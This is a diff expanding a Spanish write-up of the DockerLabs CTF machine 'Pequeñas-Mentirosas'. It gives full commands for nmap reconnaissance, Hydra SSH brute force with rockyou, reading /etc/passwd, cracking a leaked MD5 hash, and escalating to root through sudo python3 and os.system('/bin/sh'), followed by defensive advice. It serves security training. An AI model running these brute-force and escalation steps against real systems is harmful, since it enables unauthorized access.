@@ -1,74 +1,243 @@
-# PEQUENAS MENTIROSAS — DockerLabs
+# Pequeñas-Mentirosas — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** beafn28  
+**Fecha de creación:** 26/09/2024  
+**Técnicas:** Hydra · Hash Cracking · SSH · Enumeración de archivos · Python sudo abuse · GTFOBins
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **PEQUENAS MENTIROSAS** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web y acceso SSH](#2-enumeración-web-y-acceso-ssh)
+3. [Enumeración de archivos sensibles](#3-enumeración-de-archivos-sensibles)
+4. [Cracking de hash — usuario Spencer](#4-cracking-de-hash--usuario-spencer)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Lo primero que haremos es desplegar la maquina y vemos que contamos con la IP
-172.17.02
+Desplegamos la máquina vulnerable:
 
-Haremos un ping para comprobar la conexión con el servidor.
+```bash
+sudo bash auto_deploy.sh pequenas-mentirosas.tar
+```
 
-Haremos un escaneo con nmap -Pn por si el servidor no permite hacer ping,
-vemos que tenemos los puertos 22 y 80.
+> IP asignada: `172.17.0.2`
 
-## 2. Enumeración
+Comprobamos conectividad:
 
-Ahora haremos un escaneo más profundo ya sabiendo los puertos y buscando la
-versión especifica con -sCV
+```bash
+ping -c 4 172.17.0.2
+```
 
-Miraremos que aloja el servidor web
+Realizamos un escaneo inicial:
 
-Podemos intuir que un usuario es a así que vamos a hacer un ataque con hydra
-para buscar la contraseña.
+```bash
+nmap -Pn 172.17.0.2
+```
 
-## 3. Explotación
+Resultado:
 
-Ahora nos conectaremos al usuario a mediante ssh.
+```text
+22/tcp open ssh
+80/tcp open http
+```
 
-Tenemos varias opciones para esta máquina, la primera es listar /etc/passwd que
-contiene información sobre las cuentas de usuario del sistema.
+Enumeramos versiones:
 
-Vemos que cuenta con el usuario Spencer, podríamos hacer un ataque directo a
-este usuario.
+```bash
+nmap -p22,80 -sCV -Pn 172.17.0.2
+```
 
-## 4. Post-explotación
+Servicios detectados:
 
-La otra opción es mirar los ficheros con los que cuenta el servidor ya que en la
-página web nos dio una pista que tenemos cosas en los archivos del servidor.
+```text
+OpenSSH 9.2p1
+Apache httpd 2.4.62
+```
 
-Listando algunos ficheros podemos ver que nos pide que hagamos un ataque al
-usuario.
+---
 
-También hay otro fichero donde contiene un hash del usuario Spencer.
+## 2. Enumeración web y acceso SSH
+
+Accedemos al servidor web.
+
+La página muestra la siguiente pista:
+
+```text
+Pista: Encuentra la clave para A en los archivos.
+```
+
+Probamos fuerza bruta contra el usuario `a`:
+
+```bash
+hydra -l a -P /usr/share/wordlists/rockyou.txt \
+ssh://172.17.0.2
+```
+
+Resultado:
+
+```text
+login: a
+password: secret
+```
+
+Accedemos mediante SSH:
+
+```bash
+ssh a@172.17.0.2
+```
+
+---
+
+## 3. Enumeración de archivos sensibles
+
+Listamos usuarios del sistema:
+
+```bash
+cat /etc/passwd
+```
+
+Encontramos:
+
+```text
+spencer
+a
+```
+
+Exploramos archivos interesantes:
+
+```bash
+cd /srv
+ls
+```
+
+Dentro del directorio FTP encontramos:
+
+```bash
+cd ftp
+ls
+```
+
+Archivos relevantes:
+
+```text
+hash_spencer.txt
+pista_fuerza_bruta.txt
+```
+
+Leemos la pista:
+
+```bash
+cat pista_fuerza_bruta.txt
+```
+
+Contenido:
+
+```text
+Realiza un ataque de fuerza bruta para descubrir la contraseña de spencer...
+```
+
+Leemos el hash:
+
+```bash
+cat hash_spencer.txt
+```
+
+Resultado:
+
+```text
+7c6a180b36896a0a8c02787eeafb0e4c
+```
+
+---
+
+## 4. Cracking de hash — usuario Spencer
+
+Desciframos el hash utilizando CrackStation o fuerza bruta.
+
+Resultado:
+
+```text
+password1
+```
+
+También es posible encontrar la contraseña mediante Hydra:
+
+```bash
+hydra -l spencer -P /usr/share/wordlists/rockyou.txt \
+ssh://172.17.0.2
+```
+
+Accedemos al usuario:
+
+```bash
+su spencer
+```
+
+Comprobamos permisos sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(root) NOPASSWD: /usr/bin/python3
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Podríamos descifrar el hash con alguna pagina como crackstation.net y vemos
-que es la contraseña del Spencer.
+Ejecutamos Python como root:
 
-La otra opción si no hubiéramos descifrado el hash es hacer el ataque de fuerza
-bruta directamente, vemos que encontramos de igual manera la contraseña.
+```bash
+sudo python3
+```
 
-Nos registramos con las credenciales de Spencer y estamos dentro.
+Dentro de la consola Python ejecutamos:
 
-## 6. Lección aprendida
+```python
+import os
+os.system("/bin/sh")
+```
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+Verificamos privilegios:
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Contraseña débil SSH | Acceso inicial |
+| Archivos sensibles expuestos | Filtración de hashes |
+| Hash crackeable | Movimiento lateral |
+| Python ejecutable con sudo | Escalada a root |
+
+**Para defenderse:**
+
+- Utilizar contraseñas robustas.
+- No almacenar hashes accesibles para usuarios no privilegiados.
+- Restringir permisos sobre directorios compartidos.
+- Evitar binarios peligrosos ejecutables mediante sudo.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
